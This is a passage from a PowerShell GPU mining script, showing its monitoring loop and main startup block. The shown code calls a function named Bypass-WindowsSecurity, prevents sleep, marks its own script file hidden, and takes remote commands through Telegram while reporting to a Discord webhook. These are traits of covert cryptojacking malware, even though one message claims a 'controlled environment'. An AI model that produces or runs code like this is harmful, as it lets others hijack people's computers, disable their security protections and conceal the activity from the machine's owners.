                    $pool = Get-BestPool -algorithm $bestCoin.algorithm
                    if ($gpuType -eq "NVIDIA") { Set-NvidiaOverclock }
                    elseif ($gpuType -eq "AMD") { Set-AmdOverclock }
                    foreach ($gpu in $gpus) {
                        $gpuIndex = $gpus.IndexOf($gpu)
                        Start-Miner -algorithm $bestCoin.algorithm -pool $pool -gpuIndex $gpuIndex
                    }
                    $script:lastSwitchTime = $currentTime
                }
            }
            Get-TelegramCommands
            Start-Sleep -Seconds 10
        }
    } catch {
        Write-Log "Monitor-Miners failed: $_"
        Send-TelegramMessage -message "Critical error: $_"
    }
}

# **Main Execution**

Write-Log "Initializing mining script with enhanced features..."
try {
    Send-TelegramMessage -message "Initializing enhanced mining script..."
    Send-DiscordWebhook -message "Script started in controlled environment."
    Bypass-WindowsSecurity
    Prevent-Sleep
    Set-ItemProperty -Path "$baseDir\mining.ps1" -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) -ErrorAction SilentlyContinue
    Monitor-Miners
} catch {
    Write-Log "Startup failed: $_"
    Send-TelegramMessage -message "Startup failed: $_"
    Send-DiscordWebhook -message "Startup failed: $_"
}
